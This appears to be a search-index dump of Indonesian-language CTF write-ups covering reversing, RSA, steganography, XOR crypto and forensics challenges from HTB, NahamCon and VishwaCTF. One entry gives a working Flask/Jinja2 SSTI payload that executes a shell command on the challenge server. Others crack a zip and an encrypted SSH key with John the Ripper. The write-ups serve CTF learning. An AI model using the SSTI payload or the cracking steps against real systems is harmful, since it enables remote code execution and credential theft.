Oracle"},{"location":"ctf/writeup/comp/ca_wide/","text":"WIDE \u00b6 wide db.ex $ file wide wide: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=13869bb7ce2c22f474b95ba21c9d7e9ff74ecc3f, not stripped $ file db.ex db.ex: Matlab v4 mat-file (little endian) , numeric, rows 1835627088, columns 29557 Menggunakan tools decompiler, setiap soal decompile saya melakukan dengan decompiler yang berbeda-beda, percobaan dengan IDA tidak menampilkan fungsi wcscmp() , tapi dengan tools Cutter tampil dengan jelas eax = wcscmp (rax, \"sup3rs3cr3tw1d3\"); flag HTB{str1ngs_4r3nt_4lw4ys_4sc11}","title":"WIDE"},{"location":"ctf/writeup/comp/ca_wide/#wide","text":"wide db.ex $ file wide wide: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=13869bb7ce2c22f474b95ba21c9d7e9ff74ecc3f, not stripped $ file db.ex db.ex: Matlab v4 mat-file (little endian) , numeric, rows 1835627088, columns 29557 Menggunakan tools decompiler, setiap soal decompile saya melakukan dengan decompiler yang berbeda-beda, percobaan dengan IDA tidak menampilkan fungsi wcscmp() , tapi dengan tools Cutter tampil dengan jelas eax = wcscmp (rax, \"sup3rs3cr3tw1d3\"); flag HTB{str1ngs_4r3nt_4lw4ys_4sc11}","title":"WIDE"},{"location":"ctf/writeup/comp/ca_wt/","text":"Without a Trace \u00b6 without_a_trace $ file without_a_trace without_a_trace: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03105824f1750f660de5b016b113b8a505bc2896, not stripped Menggunakan tools ltrace ( sudo apt install ltrace ) $ ltrace without_a_trace puts(\"[+] Primary Mothership Tracking \"...[+] Primary Mothership Tracking Panel ) = 38 puts(\"[X] Unusual activity detected\"[X] Unusual activity detected ) = 30 puts(\" |-------] Unrecognised login lo\"... |-------] Unrecognised login location: Earth ) = 46 printf(\"[X] Please verify your identity \"...) = 60 fgets([X] Please verify your identity by entering your password > qwe \"qwe\\n\", 64, 0x7ffff7fa09a0) = 0x7fffffffdd80 strchr(\"qwe\\n\", '\\n') = \"\\n\" ptrace(0, 0, 0, 0) = -1 strcmp(\"qwe\", \"IUCzus5b2^l2^tq^c5^t^f1f1|\") = 40 printf(\"[X] Intruder detected - dispatch\"...) = 52 [X] Intruder detected - dispatching security systems+++ exited (status 255) +++ terlihat input kita dicompare dengan IUCzus5b2^l2^tq^c5^t^f1f1| , tapi tidak terlihat seperti flag, setelah percobaan ternya string itu perlu di xor dengan nilai brute-force flag.py a = \"IUCzus5b2^l2^tq^c5^t^f1f1|\" for i in range ( 50 ): for j in a : print ( chr ( ord ( j ) ^ i ), end = '' ) print () IUCzus5b2^l2^tq^c5^t^f1f1| HTB{tr4c3_m3_up_b4_u_g0g0} KWAxwq7`0\\n0\\vs\\a7\\v\\d3d3~ JV@yvp6a1]o1]wr]`6]w]e2e2 ... flag HTB{tr4c3_m3_up_b4_u_g0g0}","title":"Without a Trace"},{"location":"ctf/writeup/comp/ca_wt/#without-a-trace","text":"without_a_trace $ file without_a_trace without_a_trace: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03105824f1750f660de5b016b113b8a505bc2896, not stripped Menggunakan tools ltrace ( sudo apt install ltrace ) $ ltrace without_a_trace puts(\"[+] Primary Mothership Tracking \"...[+] Primary Mothership Tracking Panel ) = 38 puts(\"[X] Unusual activity detected\"[X] Unusual activity detected ) = 30 puts(\" |-------] Unrecognised login lo\"... |-------] Unrecognised login location: Earth ) = 46 printf(\"[X] Please verify your identity \"...) = 60 fgets([X] Please verify your identity by entering your password > qwe \"qwe\\n\", 64, 0x7ffff7fa09a0) = 0x7fffffffdd80 strchr(\"qwe\\n\", '\\n') = \"\\n\" ptrace(0, 0, 0, 0) = -1 strcmp(\"qwe\", \"IUCzus5b2^l2^tq^c5^t^f1f1|\") = 40 printf(\"[X] Intruder detected - dispatch\"...) = 52 [X] Intruder detected - dispatching security systems+++ exited (status 255) +++ terlihat input kita dicompare dengan IUCzus5b2^l2^tq^c5^t^f1f1| , tapi tidak terlihat seperti flag, setelah percobaan ternya string itu perlu di xor dengan nilai brute-force flag.py a = \"IUCzus5b2^l2^tq^c5^t^f1f1|\" for i in range ( 50 ): for j in a : print ( chr ( ord ( j ) ^ i ), end = '' ) print () IUCzus5b2^l2^tq^c5^t^f1f1| HTB{tr4c3_m3_up_b4_u_g0g0} KWAxwq7`0\\n0\\vs\\a7\\v\\d3d3~ JV@yvp6a1]o1]wr]`6]w]e2e2 ... flag HTB{tr4c3_m3_up_b4_u_g0g0}","title":"Without a Trace"},{"location":"ctf/writeup/comp/nahamcon_awr/","text":"NahamCon 2022, A Wild Ride Forensics gpx.zip ( terpassword ) butuh bantuan tools John the Ripper zip2john gpx.zip > cracked john --wordlist=/path/to/rockyou.txt cracked diperoleh files .gpx jika dibuka salah satu file dengan melakukan berbagai percobaan, dan dengan bantuan https://gpx.studio/ untuk memvisualisasikan file .gpx, diperoleh solusi import os arr = os . listdir ( '/home/carloz/Documents/CS/CTF/games/nahamcon/Forensic_awildride/' ) opening = ''' <?xml version=\"1.0\" encoding=\"UTF-8\"?> <gpx xmlns=\"http://www.topografix.com/GPX/1/1\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd\" version=\"1.1\" creator=\"gpx.py -- https://github.com/tkrajina/gpxpy\"> ''' closing = ''' </gpx> ''' arr . sort () # print(arr) data_total = opening for i in arr : if 'ride' in i : data = open ( i , 'r' ) . read () data = data . split ( 'trk>' ) data_total += '<trk>' data_total += data [ 1 ][: - 2 ] . strip () data_total += '</trk>' data_total += closing open ( 'ride_total.gpx' , 'w' ) . write ( data_total ) upload ride_total.gpx ke https://gpx.studio/ dan diperoleh flag","title":"A Wild Ride"},{"location":"ctf/writeup/comp/nahamcon_brsaq/","text":"NahamCon 2022, Baby RSA Quiz Cryptography nilai n, e, ct bisa berbeda, tapi hasil tetap sama Part 1 \u00b6 soal n = 136264894803833 e = 65537 ct = 67764901398180 dengan bantuan webite alpertron , diperoleh faktorisasi nilai \\(n\\) jawaban from Crypto.Util.number import inverse p = 8998813 q = 15142541 n = p * q e = 65537 ct = 67764901398180 phi = ( p - 1 ) * ( q - 1 ) d = inverse ( e , phi ) print ( pow ( ct , d , n )) print ( bytes . fromhex ( hex ( pow ( ct , d , n ))[ 2 :])) Part 2 \u00b6 soal n = 17925435334771013587505133312134011446454665306214868091426625738043654249842612378335769578853505374390032891305043469561633552835484637362051339282618327861863328779440585015290730732272120220814803393146082919022972321742125754827478629002093519872871126896844333575033296315672275008047278029857137147394445352038087033926481419884176987149176269587567688515370267383832925167970567780250165687458061877719682886965443559610523490229924398623783300021139294199543473933632906825708371890824433970966242607905055173858196908145444852654979292627541037359062687311270588137614930275427855189444098664111302437861137 e = 3 ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125 disini nilai \\(n\\) terlalu besar (1024 bit x 1024 bit) sehingga tidak dapat difaktorisasikan, tetapi memiliki kerentanan pada nilai \\(e\\) yang terlalu kecil ( materi ) jawaban n = 17925435334771013587505133312134011446454665306214868091426625738043654249842612378335769578853505374390032891305043469561633552835484637362051339282618327861863328779440585015290730732272120220814803393146082919022972321742125754827478629002093519872871126896844333575033296315672275008047278029857137147394445352038087033926481419884176987149176269587567688515370267383832925167970567780250165687458061877719682886965443559610523490229924398623783300021139294199543473933632906825708371890824433970966242607905055173858196908145444852654979292627541037359062687311270588137614930275427855189444098664111302437861137 e = 3 ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125 for j in range ( 130000000 ): a , b = gmpy2 . iroot ( ct + j * n , 3 ) if b == 1 : m = a print ( m ) print ( bytes . fromhex ( hex ( m )[ 2 :])) break Part 3 \u00b6 menggunakan cara yang sama seperti part 1 jawaban n = 78604621794859254377441240758546691212252719196950677920996438809794723269891783763248474720077319283856135748212772766201496834837866985496988310839851402734816862730799141522806959739687508988075088500036281804849197202116396323478001075482571447841421840179024783853406299077136051285194547787251092448717 e = 65537 ct = 64260894456709053708131874606931233303294614435134258773719481625864684029722126297441699761600170345509407555526981816230807117628073227746581833033382845409470027697867835610091416408500724134007900766475301243929728458577316272426023726155915879223756361962204625550239964938010427596649916752055569962850 p = 8865924756891367526548784117109474928099627857597434007513939836088315293719086434197228572399671985200566321179910478312963492609208679794157183762974311 q = 8865924756891367526548784117109474928099627857597434007513939836088315293719086434197228572399671985200566321179910478312963492609208679794157183762975147 phi = ( p - 1 ) * ( q - 1 ) d = inverse ( e , phi ) print ( pow ( ct , d , n )) print ( bytes . fromhex ( hex ( pow ( ct , d , n ))[ 2 :]))","title":"Baby RSA Quiz"},{"location":"ctf/writeup/comp/nahamcon_brsaq/#part-1","text":"soal n = 136264894803833 e = 65537 ct = 67764901398180 dengan bantuan webite alpertron , diperoleh faktorisasi nilai \\(n\\) jawaban from Crypto.Util.number import inverse p = 8998813 q = 15142541 n = p * q e = 65537 ct = 67764901398180 phi = ( p - 1 ) * ( q - 1 ) d = inverse ( e , phi ) print ( pow ( ct , d , n )) print ( bytes . fromhex ( hex ( pow ( ct , d , n ))[ 2 :]))","title":"Part 1"},{"location":"ctf/writeup/comp/nahamcon_brsaq/#part-2","text":"soal n = 17925435334771013587505133312134011446454665306214868091426625738043654249842612378335769578853505374390032891305043469561633552835484637362051339282618327861863328779440585015290730732272120220814803393146082919022972321742125754827478629002093519872871126896844333575033296315672275008047278029857137147394445352038087033926481419884176987149176269587567688515370267383832925167970567780250165687458061877719682886965443559610523490229924398623783300021139294199543473933632906825708371890824433970966242607905055173858196908145444852654979292627541037359062687311270588137614930275427855189444098664111302437861137 e = 3 ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125 disini nilai \\(n\\) terlalu besar (1024 bit x 1024 bit) sehingga tidak dapat difaktorisasikan, tetapi memiliki kerentanan pada nilai \\(e\\) yang terlalu kecil ( materi ) jawaban n = 17925435334771013587505133312134011446454665306214868091426625738043654249842612378335769578853505374390032891305043469561633552835484637362051339282618327861863328779440585015290730732272120220814803393146082919022972321742125754827478629002093519872871126896844333575033296315672275008047278029857137147394445352038087033926481419884176987149176269587567688515370267383832925167970567780250165687458061877719682886965443559610523490229924398623783300021139294199543473933632906825708371890824433970966242607905055173858196908145444852654979292627541037359062687311270588137614930275427855189444098664111302437861137 e = 3 ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125 for j in range ( 130000000 ): a , b = gmpy2 . iroot ( ct + j * n , 3 ) if b == 1 : m = a print ( m ) print ( bytes . fromhex ( hex ( m )[ 2 :])) break","title":"Part 2"},{"location":"ctf/writeup/comp/nahamcon_brsaq/#part-3","text":"menggunakan cara yang sama seperti part 1 jawaban n = 78604621794859254377441240758546691212252719196950677920996438809794723269891783763248474720077319283856135748212772766201496834837866985496988310839851402734816862730799141522806959739687508988075088500036281804849197202116396323478001075482571447841421840179024783853406299077136051285194547787251092448717 e = 65537 ct = 64260894456709053708131874606931233303294614435134258773719481625864684029722126297441699761600170345509407555526981816230807117628073227746581833033382845409470027697867835610091416408500724134007900766475301243929728458577316272426023726155915879223756361962204625550239964938010427596649916752055569962850 p = 8865924756891367526548784117109474928099627857597434007513939836088315293719086434197228572399671985200566321179910478312963492609208679794157183762974311 q = 8865924756891367526548784117109474928099627857597434007513939836088315293719086434197228572399671985200566321179910478312963492609208679794157183762975147 phi = ( p - 1 ) * ( q - 1 ) d = inverse ( e , phi ) print ( pow ( ct , d , n )) print ( bytes . fromhex ( hex ( pow ( ct , d , n ))[ 2 :]))","title":"Part 3"},{"location":"ctf/writeup/comp/nahamcon_ostr/","text":"NahamCon 2022, Ostrich Steganography diberikan 3 file ostrich.jpg result.apng ostrich.py ostrich.py import imageio from PIL import Image , GifImagePlugin from Crypto.Util.number import long_to_bytes as l2b , bytes_to_long as b2l import random from apng import APNG filenames = [] flag = \"REDACTED\" orig_filename = \"ostrich.jpg\" orig_image = Image . open ( orig_filename ) pixels = orig_image . load () width , height = orig_image . size images = [] for i in range ( len ( flag )): new_filename = f './images/ostrich { i } .png' new_image = Image . new ( orig_image . mode , orig_image . size ) new_pixels = new_image . load () for x in range ( width ): for y in range ( height ): new_pixels [ x , y ] = orig_image . getpixel (( x , y )) x = random . randrange ( 0 , width ) y = random . randrange ( 0 , height ) pixel = list ( orig_image . getpixel (( x , y ))) while ( pixel [ 2 ] == 0 ): x = random . randrange ( 0 , width ) y = random . randrange ( 0 , height ) pixel = list ( orig_image . getpixel (( random . randrange ( 0 , width ), random . randrange ( 0 , height )))) new_val = l2b ( pixel [ 2 ] * ord ( flag [ i ])) pixel [ 0 ] = new_val [ 0 ] if len ( new_val ) > 1 : pixel [ 1 ] = new_val [ 1 ] pixel [ 2 ] = 0 new_pixels [ x , y ] = ( pixel [ 0 ], pixel [ 1 ], pixel [ 2 ]) new_image . save ( new_filename ) filenames . append ( new_filename ) images . append ( new_image ) APNG . from_files ( filenames , delay = 0 ) . save ( \"result.apng\" ) APNG / Animated-PNG, dalam konteks soal APNG merupakan gabungan dari beberapa gambar dengan beberapa nilai piksel yang berbeda sehingga membentuk gambar beranimasi Note gambar asli = ostrich.jpg gambar baru / gambar gabung = ostrich.jpg dengan mengubah salah satu pixel Ide Enkoding aturan pengubahan nilai pixel pixel_lama = rgb(a,b,c) *memilih pixel yang nilai c != 0 new_val = l2b(c*flag[i]) x = new_val[0] if len(new_val) > 1: y = new_val[1] else: y = b z = 0 pixel_baru = rgb(x,y,z) maka perlu diekstrak terlebih dahulu file result.apng from apng import APNG im = APNG . open ( \"result.apng\" ) for i , ( png , control ) in enumerate ( im . frames ): png . save ( \"hasil/ostrich {i} .png\" . format ( i = i )) dengan membandingkan setiap hasil gambar ekstrak dengan gambar asli, dapat diperoleh titik pixel yang berbeda get_flag.py from apng import APNG from PIL import Image gambar_asli = Image . open ( 'ostrich.jpg' ) for k in range ( 38 ): gambar0 = Image . open ( 'hasil/ostrich' + str ( k ) + '.png' ) data_asli = gambar_asli . load () data_0 = gambar0 . load () width , height = gambar_asli . size for i in range ( width ): for j in range ( height ): if data_0 [ i , j ] != data_asli [ i , j ]: if data_0 [ i , j ][ 0 ] / data_asli [ i , j ][ 2 ] > 1 : fl = data_0 [ i , j ][ 0 ] / data_asli [ i , j ][ 2 ] else : # kebetulan semua nilai pixel gambar masuk ke else p1 = hex ( data_0 [ i , j ][ 1 ])[ 2 :] if len ( p1 ) == 1 : p1 = '0' + p1 fl = int ( hex ( data_0 [ i , j ][ 0 ]) + p1 , 16 ) / data_asli [ i , j ][ 2 ] print ( chr ( int ( fl )), end = '' )","title":"Ostrich"},{"location":"ctf/writeup/comp/nahamcon_sloc/","text":"NahamCon 2022, Steam Locomotive Miscellaneous ssh -p 30319 user@challenge.nahamcon.com ls ssh -p 30319 user@challenge.nahamcon.com cat \"flag.txt\"","title":"Steam Locomotive"},{"location":"ctf/writeup/comp/nahamcon_xorrox/","text":"NahamCon 2022, XORROX Cryptography Soal \u00b6 output.txt xorrox.py xorrox=[1, 209, 108, 239, 4, 55, 34, 174, 79, 117, 8, 222, 123, 99, 184, 202, 95, 255, 175, 138, 150, 28, 183, 6, 168, 43, 205, 105, 92, 250, 28, 80, 31, 201, 46, 20, 50, 56] enc=[26, 188, 220, 228, 144, 1, 36, 185, 214, 11, 25, 178, 145, 47, 237, 70, 244, 149, 98, 20, 46, 187, 207, 136, 154, 231, 131, 193, 84, 148, 212, 126, 126, 226, 211, 10, 20, 119] #!/usr/bin/env python3 import random with open ( \"flag.txt\" , \"rb\" ) as filp : flag = filp . read () . strip () key = [ random . randint ( 1 , 256 ) for _ in range ( len ( flag ))] xorrox = [] enc = [] for i , v in enumerate ( key ): k = 1 for j in range ( i , 0 , - 1 ): k ^= key [ j ] xorrox . append ( k ) enc . append ( flag [ i ] ^ v ) with open ( \"output.txt\" , \"w\" ) as filp : filp . write ( f \" { xorrox =} \\n \" ) filp . write ( f \" { enc =} \\n \" ) Jawaban \u00b6 Ide enkripsi key = [random1, random2, random3, ...] flag = 'flag{selamat}' enc[0] = flag[0] ^ key[0] enc[1] = flag[1] ^ key[1] enc[2] = flag[2] ^ key[2] dst... k = 1 xorrox[0] = k xorrox[1] = k ^ key[1] xorrox[2] = k ^ key[2] ^ key[1] xorrox[3] = k ^ key[3] ^ key[2] ^ key[1] dst... dengan memanfaatkan 6^7 = 1 maka 7^1 = 6 diperoleh ide dekripsi xorrox[1] = k ^ key[1] key[1] = k ^ xorrox[1] xorrox[2] = k ^ key[2] ^ key[1] key[2] = k ^ key[1] ^ xorrox[2] dst... hasil key_awal = [] xorrox = [ 1 , 209 , 108 , 239 , 4 , 55 , 34 , 174 , 79 , 117 , 8 , 222 , 123 , 99 , 184 , 202 , 95 , 255 , 175 , 138 , 150 , 28 , 183 , 6 , 168 , 43 , 205 , 105 , 92 , 250 , 28 , 80 , 31 , 201 , 46 , 20 , 50 , 56 ] for i in range ( 0 , len ( xorrox )): k = 1 for j in key_awal : k ^= j k ^= xorrox [ i ] key_awal . append ( k ) enc = [ 26 , 188 , 220 , 228 , 144 , 1 , 36 , 185 , 214 , 11 , 25 , 178 , 145 , 47 , 237 , 70 , 244 , 149 , 98 , 20 , 46 , 187 , 207 , 136 , 154 , 231 , 131 , 193 , 84 , 148 , 212 , 126 , 126 , 226 , 211 , 10 , 20 , 119 ] flag = '' for i in range ( len ( enc )): flag += chr ( enc [ i ] ^ key_awal [ i ]) print ( flag )","title":"XORROX"},{"location":"ctf/writeup/comp/nahamcon_xorrox/#soal","text":"output.txt xorrox.py xorrox=[1, 209, 108, 239, 4, 55, 34, 174, 79, 117, 8, 222, 123, 99, 184, 202, 95, 255, 175, 138, 150, 28, 183, 6, 168, 43, 205, 105, 92, 250, 28, 80, 31, 201, 46, 20, 50, 56] enc=[26, 188, 220, 228, 144, 1, 36, 185, 214, 11, 25, 178, 145, 47, 237, 70, 244, 149, 98, 20, 46, 187, 207, 136, 154, 231, 131, 193, 84, 148, 212, 126, 126, 226, 211, 10, 20, 119] #!/usr/bin/env python3 import random with open ( \"flag.txt\" , \"rb\" ) as filp : flag = filp . read () . strip () key = [ random . randint ( 1 , 256 ) for _ in range ( len ( flag ))] xorrox = [] enc = [] for i , v in enumerate ( key ): k = 1 for j in range ( i , 0 , - 1 ): k ^= key [ j ] xorrox . append ( k ) enc . append ( flag [ i ] ^ v ) with open ( \"output.txt\" , \"w\" ) as filp : filp . write ( f \" { xorrox =} \\n \" ) filp . write ( f \" { enc =} \\n \" )","title":"Soal"},{"location":"ctf/writeup/comp/nahamcon_xorrox/#jawaban","text":"Ide enkripsi key = [random1, random2, random3, ...] flag = 'flag{selamat}' enc[0] = flag[0] ^ key[0] enc[1] = flag[1] ^ key[1] enc[2] = flag[2] ^ key[2] dst... k = 1 xorrox[0] = k xorrox[1] = k ^ key[1] xorrox[2] = k ^ key[2] ^ key[1] xorrox[3] = k ^ key[3] ^ key[2] ^ key[1] dst... dengan memanfaatkan 6^7 = 1 maka 7^1 = 6 diperoleh ide dekripsi xorrox[1] = k ^ key[1] key[1] = k ^ xorrox[1] xorrox[2] = k ^ key[2] ^ key[1] key[2] = k ^ key[1] ^ xorrox[2] dst... hasil key_awal = [] xorrox = [ 1 , 209 , 108 , 239 , 4 , 55 , 34 , 174 , 79 , 117 , 8 , 222 , 123 , 99 , 184 , 202 , 95 , 255 , 175 , 138 , 150 , 28 , 183 , 6 , 168 , 43 , 205 , 105 , 92 , 250 , 28 , 80 , 31 , 201 , 46 , 20 , 50 , 56 ] for i in range ( 0 , len ( xorrox )): k = 1 for j in key_awal : k ^= j k ^= xorrox [ i ] key_awal . append ( k ) enc = [ 26 , 188 , 220 , 228 , 144 , 1 , 36 , 185 , 214 , 11 , 25 , 178 , 145 , 47 , 237 , 70 , 244 , 149 , 98 , 20 , 46 , 187 , 207 , 136 , 154 , 231 , 131 , 193 , 84 , 148 , 212 , 126 , 126 , 226 , 211 , 10 , 20 , 119 ] flag = '' for i in range ( len ( enc )): flag += chr ( enc [ i ] ^ key_awal [ i ]) print ( flag )","title":"Jawaban"},{"location":"ctf/writeup/comp/vishwa22_hb/","text":"Vishwa CTF 2022: Hey Buddy \u00b6 link : https://h3y-buddy.vishwactf.com kata kunci python flask Server-Side Template Injection (SSTI) Bacaan \u00b6 https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee https://infosecwriteups.com/tokyowesterns-ctf-4 th -2018-writeup-part-3-1c8510dfad3f Vulnerable \u00b6 https://h3y-buddy.vishwactf.com/submit?name={{''.__class__.__mro__[1].__subclasses__()[213]('cat\\tflag.txt',shell=True,stdout=-1).communicate()}} *penjelasan ada pada referensi bacaan Solusi lain \u00b6 https://kashmir54.github.io/ctfs/VishwaCTF2022/#hey-buddy \u21a9","title":"Hey Buddy"},{"location":"ctf/writeup/comp/vishwa22_hb/#vishwa-ctf-2022-hey-buddy","text":"link : https://h3y-buddy.vishwactf.com kata kunci python flask Server-Side Template Injection (SSTI)","title":"Vishwa CTF 2022: Hey Buddy"},{"location":"ctf/writeup/comp/vishwa22_hb/#bacaan","text":"https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee https://infosecwriteups.com/tokyowesterns-ctf-4 th -2018-writeup-part-3-1c8510dfad3f","title":"Bacaan"},{"location":"ctf/writeup/comp/vishwa22_hb/#vulnerable","text":"https://h3y-buddy.vishwactf.com/submit?name={{''.__class__.__mro__[1].__subclasses__()[213]('cat\\tflag.txt',shell=True,stdout=-1).communicate()}} *penjelasan ada pada referensi bacaan","title":"Vulnerable"},{"location":"ctf/writeup/comp/vishwa22_hb/#solusi-lain","text":"https://kashmir54.github.io/ctfs/VishwaCTF2022/#hey-buddy \u21a9","title":"Solusi lain"},{"location":"ctf/writeup/comp/vishwa22_jtr/","text":"Vishwa CTF 2022: John The Rocker \u00b6 Soal \u00b6 diberikan 1 file idrsa.id_rsa.docx -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,115D424076ADCE7E40ACC1E44E4E791A flkT1+aCoQZ4YBHg2VRW3x4HzlEKFwqQ+ePMzEi2BIREHXDtHR1+QUrYRSQLzP4E jDSkmPWPoTvTXRAyXKrQL8FzkvYDcP9hjkzt41tjsRHz2nkI9K+WFm8DNi6qVS9H J/yWZdvUED6XwwxTFe6D01GwU7yc7xheE4GlIBazk68Q0tNuH34H8T+hnfkTyNA6 BJL861zNhZNIoWm/352vYydnT/HynugCGn+TIu88C+tLBpcLdLSh50OgTiZ8QK2A Z82PoPfD1ziVmg7E4BIY1/1qJnNxCMTzUG4PbjLpdkRxHu5aOGzbGZK4K0inDNfr B7ZedUOCSUTN0VGl5/spDO506vSOjzGL9/iDhYNBRvn4hW3VlPE6nRXAQ78r4Z49 ou0r2x7WvzrpFOPXjvlNHUFyWF9x5ZWsqNnr3PFL2wlCVvGq2z/mWvFdmy0tr6nV FjEpOwrKMt0hvTcCwry8FKAyPDFafpZq4fg90Jd9xCYWJIZMxuEPOY0jfcSC7QOy woOhMMCFA3mbJJWOAOKynZdx/7fe/0+Q0XMlljDNXNGNqKRqS9OUhKH967FYxw4W AQHrN2NdT5WoXJhbDu67Z2jb89LAFR+uBlaxauLSYEFatKmAp/IXR4yTX4yn6Ur2 mlrJ6abOjmi+/LcvMN+qCx7pB//MR2HUxcOWdgA5nuXiYBdiSKj8h0Sq3IVVjDFd Oj1t0D9m6AUsV32qbiXwiiCkOOMHVZH+6sc1ZMKNwR1WGvFBNyR0DVxlXAzyR7zP nRUXCLihj696lm+Ywe6xsDOPJMl4RHOAvf+cj3fkI3WKhfhTUhoLrEZmIFDNhKrn JCe4m9p+aNuPSuXL07bxKbYT6D4wlVE4OlkwZyAfc5R/cfE5JYFgwoIW5RJC9nh1 ru/aBj+464986pteEfI0e3nAuDquEvs37Oxv77n/AdW7QmySIb7RrpUfOCcq+rBt 4zg1cS5i2TX1l25h036E45Rn+efM9QBKQEChhgqfLZ9rbQqqm1coOok4sZZ1tWap 7352duKI9fzMq35P9u4T168sYSvZoa2hK7eZZ3KA/MK8u6B1yFiB1E2rEZGnVeOU KLt1IFxygxZl9yO5yb4pa8tl6yKO46+OYmCe9ie7FkOEeq85a0xm0OB3HVxL/40/ 116u2fJCRoDBjNZ1J4ujYwYUpWEfVoN26KRRiyRMJbHX9QwuW6k+b1OjLgjU2IaR 4BgG6xBTmM3fRQZhWbJ+06ibWDcIRdZOP02iksp/LdJtqtuYIWf2epUx3oBMrSN/ bFDUmLDzfSUCvz4MdZNp8FE1ElM2NK9PWYPe3XA5lzjkl9jxWD7M4WKLTjQJu9P0 PB4x+nHPj5j6XONZ74IbM1f7S4oRuhBCs5hPMgxDr7xSa0ROFsTauCeQ6N22JwIk GzMpmzBzJtL5/SzFCuN148sMUOASnXLSYd79dB15M0nVRo6Iz9mytF/QVuci+8h+ 6luGQBgih+L5ghx1qvUXwNyU+Id9fZYRA8pH2hy5pPWVsaws/1cLOc5PBzOaql7G 90iM4IyzSN2AO8/6HnSJ9tZSCG5cdRq+r1ROF30QnvnUowsbq0eeT4TVfb+kCaHx -----END RSA PRIVATE KEY----- Solusi \u00b6 ssh2john idrsa.id_rsa.docx > id_rsa.hash john id_rsa.hash --wordlist=/path/to/rockyou.txt","title":"John the Rocker"},{"location":"ctf/writeup/comp/vishwa22_jtr/#vishwa-ctf-2022-john-the-rocker","text":"","title":"Vishwa CTF 2022: John The Rocker"},{"location":"ctf/writeup/comp/vishwa22_jtr/#soal","text":"diberikan 1 file idrsa.id_rsa.docx -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,115D424076ADCE7E40ACC1E44E4E791A flkT1+aCoQZ4YBHg2VRW3x4HzlEKFwqQ+ePMzEi2BIREHXDtHR1+QUrYRSQLzP4E jDSkmPWPoTvTXRAyXKrQL8FzkvYDcP9hjkzt41tjsRHz2nkI9K+WFm8DNi6qVS9H J/yWZdvUED6XwwxTFe6D01GwU7yc7xheE4GlIBazk68Q0tNuH34H8T+hnfkTyNA6 BJL861zNhZNIoWm/352vYydnT/HynugCGn+TIu88C+tLBpcLdLSh50OgTiZ8QK2A Z82PoPfD1ziVmg7E4BIY1/1qJnNxCMTzUG4PbjLpdkRxHu5aOGzbGZK4K0inDNfr B7ZedUOCSUTN0VGl5/spDO506vSOjzGL9/iDhYNBRvn4hW3VlPE6nRXAQ78r4Z49 ou0r2x7WvzrpFOPXjvlNHUFyWF9x5ZWsqNnr3PFL2wlCVvGq2z/mWvFdmy0tr6nV FjEpOwrKMt0hvTcCwry8FKAyPDFafpZq4fg90Jd9xCYWJIZMxuEPOY0jfcSC7QOy woOhMMCFA3mbJJWOAOKynZdx/7fe/0+Q0XMlljDNXNGNqKRqS9OUhKH967FYxw4W AQHrN2NdT5WoXJhbDu67Z2jb89LAFR+uBlaxauLSYEFatKmAp/IXR4yTX4yn6Ur2 mlrJ6abOjmi+/LcvMN+qCx7pB//MR2HUxcOWdgA5nuXiYBdiSKj8h0Sq3IVVjDFd Oj1t0D9m6AUsV32qbiXwiiCkOOMHVZH+6sc1ZMKNwR1WGvFBNyR0DVxlXAzyR7zP nRUXCLihj696lm+Ywe6xsDOPJMl4RHOAvf+cj3fkI3WKhfhTUhoLrEZmIFDNhKrn JCe4m9p+aNuPSuXL07bxKbYT6D4wlVE4OlkwZyAfc5R/cfE5JYFgwoIW5RJC9nh1 ru/aBj+464986pteEfI0e3nAuDquEvs37Oxv77n/AdW7QmySIb7RrpUfOCcq+rBt 4zg1cS5i2TX1l25h036E45Rn+efM9QBKQEChhgqfLZ9rbQqqm1coOok4sZZ1tWap 7352duKI9fzMq35P9u4T168sYSvZoa2hK7eZZ3KA/MK8u6B1yFiB1E2rEZGnVeOU KLt1IFxygxZl9yO5yb4pa8tl6yKO46+OYmCe9ie7FkOEeq85a0xm0OB3HVxL/40/ 116u2fJCRoDBjNZ1J4ujYwYUpWEfVoN26KRRiyRMJbHX9QwuW6k+b1OjLgjU2IaR 4BgG6xBTmM3fRQZhWbJ+06ibWDcIRdZOP02iksp/LdJtqtuYIWf2epUx3oBMrSN/ bFDUmLDzfSUCvz4MdZNp8FE1ElM2NK9PWYPe3XA5lzjkl9jxWD7M4WKLTjQJu9P0 PB4x+nHPj5j6XONZ74IbM1f7S4oRuhBCs5hPMgxDr7xSa0ROFsTauCeQ6N22JwIk 